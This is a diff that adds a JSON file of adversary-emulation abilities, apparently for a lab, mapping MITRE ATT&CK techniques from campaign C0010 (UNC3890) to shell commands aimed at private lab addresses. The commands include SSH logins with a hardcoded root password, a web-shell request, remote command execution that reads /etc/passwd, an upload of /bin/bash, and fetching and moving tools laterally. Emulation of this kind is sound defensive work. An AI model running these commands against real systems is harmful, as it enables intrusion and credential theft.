@@ -1,0 +1,152 @@
+[
+  {
+    "ability_id": "543281ce-dbb9-548d-9a1b-d124eb25c0fe",
+    "name": "T1584.001 - Domains",
+    "tactic": "resource-development",
+    "technique_name": "Domains",
+    "technique_id": "T1584.001",
+    "description": "During C0010, UNC3890 actors likely compromised the domain of a legitimate Israeli shipping company.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'curl -s --resolve oldsub.legitshipping.co.il:80:172.22.0.20 http://oldsub.legitshipping.co.il/; nc -vz 172.21.0.20 53; dig @172.21.0.20 oldsub.legitshipping.co.il; curl -s --header 'Host: oldsub.legitshipping.co.il' http://172.22.0.20/'"
+      }
+    ]
+  },
+  {
+    "ability_id": "eae86ac6-f7b1-55cc-9fb3-7a7699c980a7",
+    "name": "T1608.001 - Upload Malware",
+    "tactic": "resource-development",
+    "technique_name": "Upload Malware",
+    "technique_id": "T1608.001",
+    "description": "For C0010, UNC3890 actors staged malware on their infrastructure for direct download onto a compromised system.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "curl -F \"file=@/bin/bash\" http://172.21.0.20:8010/upload"
+      }
+    ]
+  },
+  {
+    "ability_id": "b6970795-061f-5af3-9d1a-577567de3cb3",
+    "name": "T1189 - Drive-by Compromise",
+    "tactic": "initial-access",
+    "technique_name": "Drive-by Compromise",
+    "technique_id": "T1189",
+    "description": "During C0010, UNC3890 actors likely established a watering hole that was hosted on a login page of a legitimate Israeli shipping company that was active until at least November 2021.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "curl http://172.21.0.20/ > /dev/null && curl http://172.21.0.20:5000/exploit.js > /tmp/exploit.js && curl --data \"username=victim&password=Passw0rd\" http://172.21.0.20/foca.php"
+      }
+    ]
+  },
+  {
+    "ability_id": "fdcf47ad-b244-560b-800b-a62005334b0c",
+    "name": "T1608.004 - Drive-by Target",
+    "tactic": "resource-development",
+    "technique_name": "Drive-by Target",
+    "technique_id": "T1608.004",
+    "description": "For C0010, the threat actors compromised the login page of a legitimate Israeli shipping company and likely established a watering hole that collected visitor information.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "curl \"http://172.21.0.20/oili.php?cmd=ip%20addr\""
+      }
+    ]
+  },
+  {
+    "ability_id": "34af5843-02fb-5ebf-a1db-1655499d60fc",
+    "name": "T1587.001 - Malware",
+    "tactic": "resource-development",
+    "technique_name": "Malware",
+    "technique_id": "T1587.001",
+    "description": "For C0010, UNC3890 actors used unique malware, including SUGARUSH and SUGARDUMP.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "curl -X POST -F 'cmd=uname -a' http://172.21.0.20:5015/exec; curl -X POST -F 'cmd=whoami' http://172.21.0.20:5015/exec; curl -X POST -F 'cmd=ps aux' http://172.21.0.20:5015/exec; curl -X POST -F 'cmd=cat /etc/passwd' http://172.21.0.20:5015/exec"
+      }
+    ]
+  },
+  {
+    "ability_id": "ab57f184-42b1-5f15-be3c-f126ddfd3592",
+    "name": "T1583.001 - Domains",
+    "tactic": "resource-development",
+    "technique_name": "Domains",
+    "technique_id": "T1583.001",
+    "description": "For C0010, UNC3890 actors established domains that appeared to be legitimate services and entities, such as LinkedIn, Facebook, Office 365, and Pfizer.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "dig @172.21.0.20 www.malicious-example.com A +short"
+      }
+    ]
+  },
+  {
+    "ability_id": "54e2a639-a5e0-551d-94d0-2ba7963ec095",
+    "name": "T1105 - Ingress Tool Transfer",
+    "tactic": "command-and-control",
+    "technique_name": "Ingress Tool Transfer",
+    "technique_id": "T1105",
+    "description": "During C0010, UNC3890 actors downloaded tools and malware onto a compromised host.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p RootPass123 scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /usr/bin/wget root@172.21.0.20:/tmp/wget;sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'chmod +x /tmp/wget && /tmp/wget -O /tmp/tool.sh http://172.21.0.20/tool.sh && /tmp/wget -O /tmp/tool.bin http://172.21.0.20/tool.bin';sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sshpass -p RootPass123 scp -o StrictHostKeyChecking=no /tmp/tool.sh root@172.22.0.20:/tmp/tool.sh';sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sshpass -p RootPass123 scp -o StrictHostKeyChecking=no /tmp/tool.bin root@172.22.0.20:/tmp/tool.bin'"
+      }
+    ]
+  },
+  {
+    "ability_id": "f5ba0057-a665-5bd8-8abb-d5e524a61c2f",
+    "name": "T1608.002 - Upload Tool",
+    "tactic": "resource-development",
+    "technique_name": "Upload Tool",
+    "technique_id": "T1608.002",
+    "description": "For C0010, UNC3890 actors staged tools on their infrastructure to download directly onto a compromised system.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "curl http://172.21.0.20/tools/tool.txt -o /tmp/tool.txt"
+      }
+    ]
+  },
+  {
+    "ability_id": "5f7f2aa0-c1b4-5567-8054-6de331dda348",
+    "name": "T1588.002 - Tool",
+    "tactic": "resource-development",
+    "technique_name": "Tool",
+    "technique_id": "T1588.002",
+    "description": "For C0010, UNC3890 actors obtained multiple publicly-available tools, including METASPLOIT, UNICORN, and NorthStar C2.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "curl -X POST -F 'cmd=uname -a' http://172.21.0.20:5000/exec; curl -X POST -F 'cmd=whoami' http://172.21.0.20:5000/exec; curl -X POST -F 'cmd=ps aux' http://172.21.0.20:5000/exec; curl -X POST -F 'cmd=cat /etc/passwd' http://172.21.0.20:5000/exec"
+      }
+    ]
+  },
+  {
+    "ability_id": "5f7f2aa0-c1b4-5567-8054-roth",
+    "name": "END OF EMULATION",
+    "tactic": "impact",
+    "technique_name": "System Shutdown",
+    "technique_id": "T1529",
+    "description": "This is the end.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "echo \"END OF C0010\""
+      }
+    ]
+  }
+]
